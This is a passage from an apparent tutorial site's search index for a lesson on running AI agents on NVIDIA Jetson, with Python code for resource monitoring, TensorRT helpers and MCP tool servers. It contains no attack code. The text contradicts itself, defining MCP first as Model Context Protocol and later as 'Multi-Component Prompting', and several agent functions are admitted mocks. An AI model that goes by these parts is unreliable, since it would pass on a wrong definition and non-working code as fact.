\"\"\"Optimize PyTorch settings for Jetson\"\"\"\n        if torch.cuda.is_available():\n            # Set memory fraction\n            torch.cuda.set_per_process_memory_fraction(\n                self.optimization_settings['gpu_memory_fraction']\n            )\n\n            # Enable memory mapping for large models\n            torch.backends.cuda.matmul.allow_tf32 = True\n            torch.backends.cudnn.allow_tf32 = True\n\n            # Optimize for inference\n            torch.backends.cudnn.benchmark = True\n            torch.backends.cudnn.deterministic = False\n\n            print(f\"Optimized PyTorch for {self.system_info.jetson_model}\")\n\n    def _start_monitoring(self):\n        \"\"\"Start background system monitoring\"\"\"\n        def monitor():\n            while self.monitoring_active:\n                try:\n                    current_info = self.get_system_info()\n                    self.performance_history.append({\n                        'timestamp': time.time(),\n                        'cpu_usage': current_info.cpu_usage,\n                        'memory_usage': current_info.memory_usage,\n                        'temperature': current_info.temperature,\n                        'gpu_memory_free': current_info.gpu_memory_free\n                    })\n\n                    # Keep only last 100 entries\n                    if len(self.performance_history) &gt; 100:\n                        self.performance_history = self.performance_history[-100:]\n\n                    # Check for thermal throttling\n                    if current_info.temperature &gt; 80:  # 80\u00b0C threshold\n                        print(f\"\u26a0\ufe0f High temperature detected: {current_info.temperature:.1f}\u00b0C\")\n                        self._thermal_management()\n\n                    # Check memory usage\n                    if current_info.memory_usage &gt; self.memory_threshold:\n                        print(f\"\u26a0\ufe0f High memory usage: {current_info.memory_usage:.1%}\")\n                        self._memory_cleanup()\n\n                    time.sleep(30)  # Monitor every 30 seconds\n\n                except Exception as e:\n                    print(f\"Monitoring error: {e}\")\n                    time.sleep(60)\n\n        self.monitoring_active = True\n        monitor_thread = threading.Thread(target=monitor, daemon=True)\n        monitor_thread.start()\n\n    def _thermal_management(self):\n        \"\"\"Handle thermal throttling\"\"\"\n        try:\n            # Reduce GPU frequency if possible\n            subprocess.run(['sudo', 'jetson_clocks', '--restore'], check=False)\n\n            # Force garbage collection\n            gc.collect()\n            if torch.cuda.is_available():\n                torch.cuda.empty_cache()\n\n            print(\"Applied thermal management measures\")\n        except Exception as e:\n            print(f\"Thermal management error: {e}\")\n\n    def _memory_cleanup(self):\n        \"\"\"Perform memory cleanup\"\"\"\n        try:\n            # Python garbage collection\n            gc.collect()\n\n            # PyTorch cache cleanup\n            if torch.cuda.is_available():\n                torch.cuda.empty_cache()\n                torch.cuda.synchronize()\n\n            print(\"Performed memory cleanup\")\n        except Exception as e:\n            print(f\"Memory cleanup error: {e}\")\n\n    def get_performance_report(self) -&gt; Dict[str, Any]:\n        \"\"\"Generate performance report\"\"\"\n        if not self.performance_history:\n            return {\"status\": \"No performance data available\"}\n\n        recent_data = self.performance_history[-10:]  # Last 10 entries\n\n        avg_cpu = sum(entry['cpu_usage'] for entry in recent_data) / len(recent_data)\n        avg_memory = sum(entry['memory_usage'] for entry in recent_data) / len(recent_data)\n        avg_temp = sum(entry['temperature'] for entry in recent_data) / len(recent_data)\n\n        return {\n            \"system_info\": self.system_info,\n            \"average_cpu_usage\": f\"{avg_cpu:.1f}%\",\n            \"average_memory_usage\": f\"{avg_memory:.1%}\",\n            \"average_temperature\": f\"{avg_temp:.1f}\u00b0C\",\n            \"optimization_settings\": self.optimization_settings,\n            \"recommendations\": self._get_recommendations(avg_cpu, avg_memory, avg_temp)\n        }\n\n    def _get_recommendations(self, cpu_usage: float, memory_usage: float, temperature: float) -&gt; List[str]:\n        \"\"\"Get optimization recommendations\"\"\"\n        recommendations = []\n\n        if cpu_usage &gt; 80:\n            recommendations.append(\"Consider reducing batch sizes or using fewer concurrent workers\")\n\n        if memory_usage &gt; 0.85:\n            recommendations.append(\"Enable more aggressive memory cleanup or reduce model size\")\n\n        if temperature &gt; 75:\n            recommendations.append(\"Improve cooling or reduce computational load\")\n\n        if not recommendations:\n            recommendations.append(\"System performance is optimal\")\n\n        return recommendations\n\nclass OptimizedJetsonAgent:\n    \"\"\"AI Agent optimized for Jetson performance\"\"\"\n\n    def __init__(self, llm, memory_manager, tools, optimizer: JetsonOptimizer):\n        self.llm = llm\n        self.memory_manager = memory_manager\n        self.tools = {tool.name: tool for tool in tools}\n        self.optimizer = optimizer\n        self.executor = ThreadPoolExecutor(\n            max_workers=optimizer.optimization_settings['max_workers']\n        )\n\n        # Apply optimizations\n        self.optimizer.optimize_torch_settings()\n\n    def process_query_optimized(self, query: str, session_id: str = \"default\") -&gt; str:\n        \"\"\"Process query with Jetson optimizations\"\"\"\n        start_time = time.time()\n\n        try:\n            # Check system resources before processing\n            current_info = self.optimizer.get_system_info()\n\n            if current_info.memory_usage &gt; 0.9:\n                self.optimizer._memory_cleanup()\n                return \"System memory is critically low. Please try again in a moment.\"\n\n            if current_info.temperature &gt; 85:\n                return \"System temperature is too high. Please allow cooling before continuing.\"\n\n            # Get memory context (optimized)\n            memory_context = self.memory_manager.get_context_for_query(\n                query, max_context_length=1000  # Reduced for Jetson\n            )\n\n            # Process with resource-aware batching\n            response = self._process_with_batching(query, memory_context)\n\n            # Update memory asynchronously\n            self.executor.submit(\n                self.memory_manager.update_conversation_memory,\n                query, response, session_id\n            )\n\n            processing_time = time.time() - start_time\n            print(f\"Query processed in {processing_time:.2f}s\")\n\n            return response\n\n        except Exception as e:\n            return f\"Error processing query: {str(e)}\"\n\n    def _process_with_batching(self, query: str, context: str) -&gt; str:\n        \"\"\"Process query with optimized batching\"\"\"\n        # Simplified prompt for better performance\n        prompt = f\"Context: {context[:500]}...\\n\\nQuery: {query}\\n\\nResponse:\"\n\n        # Use optimized inference settings\n        with torch.inference_mode():\n            response = self.llm.invoke(prompt)\n\n        return response\n\n    def get_system_status(self) -&gt; Dict[str, Any]:\n        \"\"\"Get comprehensive system status\"\"\"\n        return self.optimizer.get_performance_report()\n\n# Usage example\noptimizer = JetsonOptimizer()\nprint(f\"Detected: {optimizer.system_info.jetson_model}\")\nprint(f\"Optimization settings: {optimizer.optimization_settings}\")\n\n# Create optimized agent\noptimized_agent = OptimizedJetsonAgent(\n    llm=llm,\n    memory_manager=memory_manager,\n    tools=all_tools,\n    optimizer=optimizer\n)\n\n# Test optimized processing\nresponse = optimized_agent.process_query_optimized(\n    \"What are the best practices for optimizing AI models on Jetson?\"\n)\nprint(response)\n\n# Get system status\nstatus = optimized_agent.get_system_status()\nprint(\"\\nSystem Status:\")\nfor key, value in status.items():\n    print(f\"{key}: {value}\")\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#hardware-acceleration-utilities","title":"\ud83d\udd27 Hardware Acceleration Utilities","text":"<pre><code>class JetsonAccelerationUtils:\n    \"\"\"Utilities for hardware acceleration on Jetson\"\"\"\n\n    @staticmethod\n    def optimize_embedding_model(model_name: str, precision: str = \"fp16\") -&gt; Any:\n        \"\"\"Optimize embedding model for Jetson\"\"\"\n        try:\n            from sentence_transformers import SentenceTransformer\n            import torch\n\n            # Load model\n            model = SentenceTransformer(model_name)\n\n            # Move to GPU if available\n            if torch.cuda.is_available():\n                model = model.to('cuda')\n\n                # Apply precision optimization\n                if precision == \"fp16\":\n                    model = model.half()\n\n                # Optimize for inference\n                model.eval()\n\n                # Compile model for better performance (PyTorch 2.0+)\n                try:\n                    model = torch.compile(model)\n                except Exception:\n                    pass  # Fallback if compile not available\n\n            return model\n\n        except Exception as e:\n            print(f\"Model optimization failed: {e}\")\n            return None\n\n    @staticmethod\n    def create_tensorrt_engine(model_path: str, input_shape: tuple) -&gt; Optional[str]:\n        \"\"\"Create TensorRT engine for model acceleration\"\"\"\n        try:\n            import tensorrt as trt\n\n            # This is a simplified example\n            # In practice, you'd need to convert your specific model\n            print(f\"Creating TensorRT engine for {model_path}\")\n            print(f\"Input shape: {input_shape}\")\n\n            # TensorRT optimization would go here\n            # Return path to optimized engine\n            return f\"{model_path}.trt\"\n\n        except ImportError:\n            print(\"TensorRT not available\")\n            return None\n        except Exception as e:\n            print(f\"TensorRT optimization failed: {e}\")\n            return None\n\n    @staticmethod\n    def benchmark_inference(model, sample_input, num_runs: int = 100) -&gt; Dict[str, float]:\n        \"\"\"Benchmark model inference performance\"\"\"\n        import time\n        import torch\n\n        # Warmup\n        for _ in range(10):\n            with torch.no_grad():\n                _ = model(sample_input)\n\n        # Benchmark\n        torch.cuda.synchronize() if torch.cuda.is_available() else None\n        start_time = time.time()\n\n        for _ in range(num_runs):\n            with torch.no_grad():\n                _ = model(sample_input)\n\n        torch.cuda.synchronize() if torch.cuda.is_available() else None\n        end_time = time.time()\n\n        total_time = end_time - start_time\n        avg_time = total_time / num_runs\n        throughput = num_runs / total_time\n\n        return {\n            \"average_latency_ms\": avg_time * 1000,\n            \"throughput_fps\": throughput,\n            \"total_time_s\": total_time\n        }\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#model-context-protocol-mcp-integration","title":"\ud83d\udd0c Model Context Protocol (MCP) Integration","text":""},{"location":"curriculum/my_10_local_ai_agents_jetson/#introduction-to-mcp","title":"\ud83d\udccb Introduction to MCP","text":"<p>Model Context Protocol (MCP) is an open standard for connecting AI assistants to data sources and tools. It provides a standardized way to integrate external resources with language models.</p> <p>Key MCP Benefits: - Standardized Integration: Universal protocol for connecting tools and data sources - Security: Controlled access to resources with proper authentication - Extensibility: Easy to add new tools and data sources - Interoperability: Works across different AI platforms and models - Local Control: Perfect for edge AI applications on Jetson</p>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#mcp-architecture-for-jetson","title":"\ud83c\udfd7\ufe0f MCP Architecture for Jetson","text":"<pre><code>graph TB\n    subgraph \"Jetson Device\"\n        subgraph \"MCP Client\"\n            A[AI Agent] --&gt; B[MCP Client]\n            B --&gt; C[Protocol Handler]\n        end\n\n        subgraph \"MCP Servers\"\n            D[Document Server]\n            E[Web Search Server]\n            F[System Monitor Server]\n            G[File System Server]\n        end\n\n        subgraph \"Local Resources\"\n            H[PDF Documents]\n            I[Vector Database]\n            J[System Metrics]\n            K[Local Files]\n        end\n    end\n\n    subgraph \"External Resources\"\n        L[Web APIs]\n        M[Online Databases]\n    end\n\n    C --&gt; D\n    C --&gt; E\n    C --&gt; F\n    C --&gt; G\n\n    D --&gt; H\n    D --&gt; I\n    E --&gt; L\n    F --&gt; J\n    G --&gt; K\n    E --&gt; M\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#building-mcp-servers-for-jetson","title":"\ud83d\udee0\ufe0f Building MCP Servers for Jetson","text":""},{"location":"curriculum/my_10_local_ai_agents_jetson/#document-processing-mcp-server","title":"Document Processing MCP Server","text":"<pre><code>import asyncio\nimport json\nfrom typing import Dict, List, Any, Optional\nfrom dataclasses import dataclass\nfrom pathlib import Path\nimport aiofiles\nfrom mcp import Server, types\nfrom mcp.server import stdio\nfrom mcp.types import Tool, TextContent, ImageContent\n\n@dataclass\nclass MCPDocumentServer:\n    \"\"\"MCP Server for document processing on Jetson\"\"\"\n\n    def __init__(self, document_processor, vector_store_path: str):\n        self.document_processor = document_processor\n        self.vector_store_path = vector_store_path\n        self.server = Server(\"jetson-document-server\")\n        self._setup_tools()\n\n    def _setup_tools(self):\n        \"\"\"Setup MCP tools for document operations\"\"\"\n\n        @self.server.list_tools()\n        async def list_tools() -&gt; List[Tool]:\n            return [\n                Tool(\n                    name=\"search_documents\",\n                    description=\"Search through local documents using semantic similarity\",\n                    inputSchema={\n                        \"type\": \"object\",\n                        \"properties\": {\n                            \"query\": {\n                                \"type\": \"string\",\n                                \"description\": \"Search query for documents\"\n                            },\n                            \"max_results\": {\n                                \"type\": \"integer\",\n                                \"description\": \"Maximum number of results to return\",\n                                \"default\": 5\n                            },\n                            \"similarity_threshold\": {\n                                \"type\": \"number\",\n                                \"description\": \"Minimum similarity score (0-1)\",\n                                \"default\": 0.7\n                            }\n                        },\n                        \"required\": [\"query\"]\n                    }\n                ),\n                Tool(\n                    name=\"add_document\",\n                    description=\"Add a new document to the knowledge base\",\n                    inputSchema={\n                        \"type\": \"object\",\n                        \"properties\": {\n                            \"file_path\": {\n                                \"type\": \"string\",\n                                \"description\": \"Path to the document file\"\n                            },\n                            \"metadata\": {\n                                \"type\": \"object\",\n                                \"description\": \"Additional metadata for the document\"\n                            }\n                        },\n                        \"required\": [\"file_path\"]\n                    }\n                ),\n                Tool(\n                    name=\"list_documents\",\n                    description=\"List all documents in the knowledge base\",\n                    inputSchema={\n                        \"type\": \"object\",\n                        \"properties\": {\n                            \"category\": {\n                                \"type\": \"string\",\n                                \"description\": \"Filter by document category\"\n                            }\n                        }\n                    }\n                ),\n                Tool(\n                    name=\"get_document_summary\",\n                    description=\"Get summary of a specific document\",\n                    inputSchema={\n                        \"type\": \"object\",\n                        \"properties\": {\n                            \"document_id\": {\n                                \"type\": \"string\",\n                                \"description\": \"ID of the document\"\n                            }\n                        },\n                        \"required\": [\"document_id\"]\n                    }\n                )\n            ]\n\n        @self.server.call_tool()\n        async def call_tool(name: str, arguments: Dict[str, Any]) -&gt; List[TextContent]:\n            \"\"\"Handle tool calls\"\"\"\n\n            if name == \"search_documents\":\n                return await self._search_documents(\n                    arguments[\"query\"],\n                    arguments.get(\"max_results\", 5),\n                    arguments.get(\"similarity_threshold\", 0.7)\n                )\n\n            elif name == \"add_document\":\n                return await self._add_document(\n                    arguments[\"file_path\"],\n                    arguments.get(\"metadata\", {})\n                )\n\n            elif name == \"list_documents\":\n                return await self._list_documents(\n                    arguments.get(\"category\")\n                )\n\n            elif name == \"get_document_summary\":\n                return await self._get_document_summary(\n                    arguments[\"document_id\"]\n                )\n\n            else:\n                raise ValueError(f\"Unknown tool: {name}\")\n\n    async def _search_documents(self, query: str, max_results: int, threshold: float) -&gt; List[TextContent]:\n        \"\"\"Search documents using the document processor\"\"\"\n        try:\n            # Load vector store\n            vector_store = self.document_processor.load_vector_store(self.vector_store_path)\n\n            if not vector_store:\n                return [TextContent(\n                    type=\"text\",\n                    text=\"No documents found in the knowledge base. Please add documents first.\"\n                )]\n\n            # Perform search\n            results = vector_store.similarity_search_with_score(query, k=max_results)\n\n            # Filter by threshold\n            filtered_results = [(doc, score) for doc, score in results if score &gt;= threshold]\n\n            if not filtered_results:\n                return [TextContent(\n                    type=\"text\",\n                    text=f\"No documents found matching '{query}' with similarity &gt;= {threshold}\"\n                )]\n\n            # Format results\n            response_text = f\"Found {len(filtered_results)} documents matching '{query}':\\n\\n\"\n\n            for i, (doc, score) in enumerate(filtered_results, 1):\n                response_text += f\"{i}. **Score: {score:.3f}**\\n\"\n                response_text += f\"   Source: {doc.metadata.get('source', 'Unknown')}\\n\"\n                response_text += f\"   Content: {doc.page_content[:200]}...\\n\\n\"\n\n            return [TextContent(type=\"text\", text=response_text)]\n\n        except Exception as e:\n            return [TextContent(\n                type=\"text\",\n                text=f\"Error searching documents: {str(e)}\"\n            )]\n\n    async def _add_document(self, file_path: str, metadata: Dict[str, Any]) -&gt; List[TextContent]:\n        \"\"\"Add a new document to the knowledge base\"\"\"\n        try:\n            # Check if file exists\n            if not Path(file_path).exists():\n                return [TextContent(\n                    type=\"text\",\n                    text=f\"File not found: {file_path}\"\n                )]\n\n            # Process document\n            documents = self.document_processor.process_document(file_path)\n\n            if not documents:\n                return [TextContent(\n                    type=\"text\",\n                    text=f\"Failed to process document: {file_path}\"\n                )]\n\n            # Add metadata\n            for doc in documents:\n                doc.metadata.update(metadata)\n                doc.metadata['added_timestamp'] = asyncio.get_event_loop().time()\n\n            # Update vector store\n            vector_store = self.document_processor.load_vector_store(self.vector_store_path)\n            if vector_store:\n                vector_store.add_documents(documents)\n            else:\n                vector_store = self.document_processor.build_vector_store(documents)\n\n            # Save updated vector store\n            self.document_processor.save_vector_store(vector_store, self.vector_store_path)\n\n            return [TextContent(\n                type=\"text\",\n                text=f\"Successfully added {len(documents)} chunks from {file_path} to the knowledge base.\"\n            )]\n\n        except Exception as e:\n            return [TextContent(\n                type=\"text\",\n                text=f\"Error adding document: {str(e)}\"\n            )]\n\n    async def _list_documents(self, category: Optional[str] = None) -&gt; List[TextContent]:\n        \"\"\"List all documents in the knowledge base\"\"\"\n        try:\n            vector_store = self.document_processor.load_vector_store(self.vector_store_path)\n\n            if not vector_store:\n                return [TextContent(\n                    type=\"text\",\n                    text=\"No documents in the knowledge base.\"\n                )]\n\n            # Get all documents (this is a simplified approach)\n            # In practice, you'd want to maintain a separate index\n            all_docs = vector_store.similarity_search(\"\", k=1000)  # Get many docs\n\n            # Extract unique sources\n            sources = set()\n            for doc in all_docs:\n                source = doc.metadata.get('source', 'Unknown')\n                if category is None or doc.metadata.get('category') == category:\n                    sources.add(source)\n\n            if not sources:\n                filter_text = f\" in category '{category}'\" if category else \"\"\n                return [TextContent(\n                    type=\"text\",\n                    text=f\"No documents found{filter_text}.\"\n                )]\n\n            response_text = f\"Documents in knowledge base{' (category: ' + category + ')' if category else ''}:\\n\\n\"\n            for i, source in enumerate(sorted(sources), 1):\n                response_text += f\"{i}. {source}\\n\"\n\n            return [TextContent(type=\"text\", text=response_text)]\n\n        except Exception as e:\n            return [TextContent(\n                type=\"text\",\n                text=f\"Error listing documents: {str(e)}\"\n            )]\n\n    async def _get_document_summary(self, document_id: str) -&gt; List[TextContent]:\n        \"\"\"Get summary of a specific document\"\"\"\n        try:\n            # This is a simplified implementation\n            # In practice, you'd maintain document metadata separately\n            return [TextContent(\n                type=\"text\",\n                text=f\"Document summary for {document_id} would be implemented here.\"\n            )]\n\n        except Exception as e:\n            return [TextContent(\n                type=\"text\",\n                text=f\"Error getting document summary: {str(e)}\"\n            )]\n\n# Web Search MCP Server\n@dataclass\nclass MCPWebSearchServer:\n    \"\"\"MCP Server for web search functionality\"\"\"\n\n    def __init__(self, web_search_tool):\n        self.web_search_tool = web_search_tool\n        self.server = Server(\"jetson-web-search-server\")\n        self._setup_tools()\n\n    def _setup_tools(self):\n        \"\"\"Setup MCP tools for web search\"\"\"\n\n        @self.server.list_tools()\n        async def list_tools() -&gt; List[Tool]:\n            return [\n                Tool(\n                    name=\"web_search\",\n                    description=\"Search the web for information\",\n                    inputSchema={\n                        \"type\": \"object\",\n                        \"properties\": {\n                            \"query\": {\n                                \"type\": \"string\",\n                                \"description\": \"Search query\"\n                            },\n                            \"max_results\": {\n                                \"type\": \"integer\",\n                                \"description\": \"Maximum number of results\",\n                                \"default\": 5\n                            },\n                            \"search_engine\": {\n                                \"type\": \"string\",\n                                \"description\": \"Search engine to use\",\n                                \"enum\": [\"google\", \"duckduckgo\"],\n                                \"default\": \"duckduckgo\"\n                            }\n                        },\n                        \"required\": [\"query\"]\n                    }\n                ),\n                Tool(\n                    name=\"extract_webpage\",\n                    description=\"Extract and summarize content from a webpage\",\n                    inputSchema={\n                        \"type\": \"object\",\n                        \"properties\": {\n                            \"url\": {\n                                \"type\": \"string\",\n                                \"description\": \"URL of the webpage to extract\"\n                            },\n                            \"max_length\": {\n                                \"type\": \"integer\",\n                                \"description\": \"Maximum length of extracted content\",\n                                \"default\": 1000\n                            }\n                        },\n                        \"required\": [\"url\"]\n                    }\n                )\n            ]\n\n        @self.server.call_tool()\n        async def call_tool(name: str, arguments: Dict[str, Any]) -&gt; List[TextContent]:\n            \"\"\"Handle tool calls\"\"\"\n\n            if name == \"web_search\":\n                return await self._web_search(\n                    arguments[\"query\"],\n                    arguments.get(\"max_results\", 5),\n                    arguments.get(\"search_engine\", \"duckduckgo\")\n                )\n\n            elif name == \"extract_webpage\":\n                return await self._extract_webpage(\n                    arguments[\"url\"],\n                    arguments.get(\"max_length\", 1000)\n                )\n\n            else:\n                raise ValueError(f\"Unknown tool: {name}\")\n\n    async def _web_search(self, query: str, max_results: int, search_engine: str) -&gt; List[TextContent]:\n        \"\"\"Perform web search\"\"\"\n        try:\n            results = await asyncio.get_event_loop().run_in_executor(\n                None, self.web_search_tool.search, query, max_results\n            )\n\n            if not results:\n                return [TextContent(\n                    type=\"text\",\n                    text=f\"No results found for '{query}'\"\n                )]\n\n            response_text = f\"Web search results for '{query}':\\n\\n\"\n\n            for i, result in enumerate(results, 1):\n                response_text += f\"{i}. **{result.get('title', 'No title')}**\\n\"\n                response_text += f\"   URL: {result.get('url', 'No URL')}\\n\"\n                response_text += f\"   Snippet: {result.get('snippet', 'No snippet')}\\n\\n\"\n\n            return [TextContent(type=\"text\", text=response_text)]\n\n        except Exception as e:\n            return [TextContent(\n                type=\"text\",\n                text=f\"Error performing web search: {str(e)}\"\n            )]\n\n    async def _extract_webpage(self, url: str, max_length: int) -&gt; List[TextContent]:\n        \"\"\"Extract content from webpage\"\"\"\n        try:\n            content = await asyncio.get_event_loop().run_in_executor(\n                None, self.web_search_tool.extract_content, url\n            )\n\n            if not content:\n                return [TextContent(\n                    type=\"text\",\n                    text=f\"Failed to extract content from {url}\"\n                )]\n\n            # Truncate if too long\n            if len(content) &gt; max_length:\n                content = content[:max_length] + \"...\"\n\n            response_text = f\"Content extracted from {url}:\\n\\n{content}\"\n\n            return [TextContent(type=\"text\", text=response_text)]\n\n        except Exception as e:\n            return [TextContent(\n                type=\"text\",\n                text=f\"Error extracting webpage content: {str(e)}\"\n            )]\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#mcp-based-ai-agent","title":"\ud83e\udd16 MCP-Based AI Agent","text":"<pre><code>import asyncio\nfrom typing import List, Dict, Any\nfrom mcp.client import stdio\nfrom mcp.types import Tool\n\nclass MCPJetsonAgent:\n    \"\"\"AI Agent using MCP for tool integration\"\"\"\n\n    def __init__(self, llm, mcp_servers: List[str]):\n        self.llm = llm\n        self.mcp_clients = {}\n        self.available_tools = {}\n\n        # Initialize MCP clients\n        asyncio.create_task(self._initialize_mcp_clients(mcp_servers))\n\n    async def _initialize_mcp_clients(self, server_commands: List[str]):\n        \"\"\"Initialize MCP client connections\"\"\"\n        for i, server_command in enumerate(server_commands):\n            try:\n                # Create stdio client for each server\n                client_name = f\"server_{i}\"\n\n                # In practice, you'd start the server process and connect\n                # This is a simplified example\n                print(f\"Connecting to MCP server: {server_command}\")\n\n                # Store client reference\n                self.mcp_clients[client_name] = {\n                    'command': server_command,\n                    'connected': True\n                }\n\n                # Get available tools from this server\n                await self._load_tools_from_server(client_name)\n\n            except Exception as e:\n                print(f\"Failed to connect to MCP server {server_command}: {e}\")\n\n    async def _load_tools_from_server(self, client_name: str):\n        \"\"\"Load available tools from an MCP server\"\"\"\n        try:\n            # In practice, you'd call the actual MCP client\n            # This is a mock implementation\n\n            if \"document\" in self.mcp_clients[client_name]['command']:\n                self.available_tools.update({\n                    'search_documents': {\n                        'server': client_name,\n                        'description': 'Search through local documents'\n                    },\n                    'add_document': {\n                        'server': client_name,\n                        'description': 'Add document to knowledge base'\n                    },\n                    'list_documents': {\n                        'server': client_name,\n                        'description': 'List all documents'\n                    }\n                })\n\n            elif \"web\" in self.mcp_clients[client_name]['command']:\n                self.available_tools.update({\n                    'web_search': {\n                        'server': client_name,\n                        'description': 'Search the web'\n                    },\n                    'extract_webpage': {\n                        'server': client_name,\n                        'description': 'Extract webpage content'\n                    }\n                })\n\n            print(f\"Loaded tools from {client_name}: {list(self.available_tools.keys())}\")\n\n        except Exception as e:\n            print(f\"Error loading tools from {client_name}: {e}\")\n\n    async def process_query(self, query: str) -&gt; str:\n        \"\"\"Process user query using MCP tools\"\"\"\n        try:\n            # Analyze query to determine needed tools\n            needed_tools = self._analyze_query_for_tools(query)\n\n            # Execute tools if needed\n            tool_results = []\n            for tool_name, tool_args in needed_tools:\n                if tool_name in self.available_tools:\n                    result = await self._execute_mcp_tool(tool_name, tool_args)\n                    tool_results.append(f\"Tool {tool_name}: {result}\")\n\n            # Combine results with LLM\n            context = \"\\n\".join(tool_results) if tool_results else \"No additional context needed.\"\n\n            prompt = f\"\"\"\nUser Query: {query}\n\nAvailable Tools: {list(self.available_tools.keys())}\n\nTool Results:\n{context}\n\nPlease provide a comprehensive response based on the query and any tool results.\n\"\"\"\n\n            response = await asyncio.get_event_loop().run_in_executor(\n                None, self.llm.invoke, prompt\n            )\n\n            return response\n\n        except Exception as e:\n            return f\"Error processing query: {str(e)}\"\n\n    def _analyze_query_for_tools(self, query: str) -&gt; List[tuple]:\n        \"\"\"Analyze query to determine which tools to use\"\"\"\n        tools_to_use = []\n        query_lower = query.lower()\n\n        # Simple keyword-based tool selection\n        if any(word in query_lower for word in ['search', 'find', 'document', 'pdf']):\n            # Extract search terms (simplified)\n            search_terms = query  # In practice, you'd extract key terms\n            tools_to_use.append(('search_documents', {'query': search_terms}))\n\n        if any(word in query_lower for word in ['web', 'online', 'internet', 'latest']):\n            tools_to_use.append(('web_search', {'query': query}))\n\n        if 'add' in query_lower and any(word in query_lower for word in ['document', 'file']):\n            # This would need more sophisticated parsing\n            pass\n\n        return tools_to_use\n\n    async def _execute_mcp_tool(self, tool_name: str, tool_args: Dict[str, Any]) -&gt; str:\n        \"\"\"Execute an MCP tool\"\"\"\n        try:\n            tool_info = self.available_tools[tool_name]\n            server_name = tool_info['server']\n\n            # In practice, you'd call the actual MCP client\n            # This is a mock implementation\n            print(f\"Executing {tool_name} on {server_name} with args: {tool_args}\")\n\n            # Mock responses based on tool type\n            if tool_name == 'search_documents':\n                return f\"Found 3 documents related to '{tool_args.get('query', '')}'\"\n            elif tool_name == 'web_search':\n                return f\"Found 5 web results for '{tool_args.get('query', '')}'\"\n            elif tool_name == 'extract_webpage':\n                return f\"Extracted content from {tool_args.get('url', '')}\"\n            else:\n                return f\"Executed {tool_name} successfully\"\n\n        except Exception as e:\n            return f\"Error executing {tool_name}: {str(e)}\"\n\n    def get_available_tools(self) -&gt; Dict[str, Any]:\n        \"\"\"Get list of available tools\"\"\"\n        return self.available_tools\n\n    async def add_mcp_server(self, server_command: str):\n        \"\"\"Add a new MCP server at runtime\"\"\"\n        await self._initialize_mcp_clients([server_command])\n\n# Usage Example\nasync def main():\n    # Initialize MCP-based agent\n    mcp_servers = [\n        \"python document_server.py\",\n        \"python web_search_server.py\"\n    ]\n\n    agent = MCPJetsonAgent(llm=llm, mcp_servers=mcp_servers)\n\n    # Wait for initialization\n    await asyncio.sleep(2)\n\n    # Test queries\n    queries = [\n        \"Search for documents about machine learning\",\n        \"Find the latest news about NVIDIA Jetson\",\n        \"What are the best practices for edge AI?\"\n    ]\n\n    for query in queries:\n        print(f\"\\nQuery: {query}\")\n        response = await agent.process_query(query)\n        print(f\"Response: {response}\")\n\n    print(f\"\\nAvailable tools: {agent.get_available_tools()}\")\n\n# Run the example\nif __name__ == \"__main__\":\n    asyncio.run(main())\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#mcp-vs-langchain-comparison","title":"\ud83d\udd04 MCP vs LangChain Comparison","text":"Feature LangChain Approach MCP Approach Tool Integration Direct Python imports Standardized protocol Scalability Monolithic agent Distributed servers Security Process-level Protocol-level isolation Interoperability Python-specific Language agnostic Development Single codebase Modular servers Performance Direct calls Network overhead Maintenance Coupled updates Independent updates Resource Usage Single process Multiple processes"},{"location":"curriculum/my_10_local_ai_agents_jetson/#deployment-on-jetson","title":"\ud83d\ude80 Deployment on Jetson","text":"<pre><code># Install MCP dependencies\npip install mcp\n\n# Start document server\npython document_mcp_server.py &amp;\n\n# Start web search server\npython web_search_mcp_server.py &amp;\n\n# Start main agent\npython mcp_jetson_agent.py\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#performance-comparison","title":"\ud83d\udcca Performance Comparison","text":"Metric LangChain Agent MCP Agent Startup Time 2-3 seconds 5-7 seconds Memory Usage 1.2 GB 1.8 GB Query Latency 0.5-1.0s 0.8-1.5s Modularity Low High Fault Tolerance Low High Scalability Medium High"},{"location":"curriculum/my_10_local_ai_agents_jetson/#function-calling-support-tool-use-via-json","title":"\ud83e\udd1d Function Calling Support (Tool Use via JSON)","text":"<p>Function calling enables structured tool invocation from LLMs using JSON schema.</p>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#why-its-useful","title":"Why it's useful:","text":"<ul> <li>Enables precision in tool execution</li> <li>Easy to parse and extend with APIs</li> <li>Supported by OpenAI, Ollama (some models), and LangChain</li> </ul> <p>LangChain integrates this using the ReActAgent + Tool definitions.</p>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#what-is-mcp-multi-component-prompting","title":"\ud83e\uddf0 What is MCP (Multi-Component Prompting)?","text":"<p>MCP involves splitting prompts into parts to:</p> <ul> <li>Improve performance on edge LLMs</li> <li>Isolate tool planning from reasoning</li> <li>Modularize prompt templates</li> </ul> <p>Useful when chaining reasoning across multiple tools or responses.</p>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#agent-tools","title":"\ud83d\udd0c Agent Tools","text":"<p>LangChain provides many tools for agents:</p> <ul> <li><code>Python REPL</code> (math, logic, data)</li> <li><code>File system access</code></li> <li><code>Search/QA</code></li> <li><code>Terminal commands</code> (\u26a0\ufe0f safe usage required)</li> </ul>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#agent-types-langchain","title":"\ud83d\ude80 Agent Types (LangChain)","text":"<ul> <li>ZeroShotAgent: Selects tools via LLM</li> <li>ReActAgent: Combines reasoning and acting</li> <li>Toolkits: Bundled tools for DevOps, CSV, web</li> </ul>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#lab-local-langchain-agent-with-llamacpp-or-ollama","title":"\ud83e\uddea Lab: Local LangChain Agent with llama.cpp or Ollama","text":""},{"location":"curriculum/my_10_local_ai_agents_jetson/#setup","title":"\ud83e\uddf0 Setup","text":"<pre><code>pip install langchain llama-cpp-python\n</code></pre>"},{"location":"curriculum/my_10_local_ai_agents_jetson/#llamacpp-backend","title":"\u2705 llama.cpp Backend","text":"<pre><code>from langchain.tools import PythonREPLTool\nfrom langchain.agents import initialize_agent, AgentType\nfrom langchain.llms import LlamaCpp\n\nllm = LlamaCpp(model_path=\"/models/mistral.gguf\", 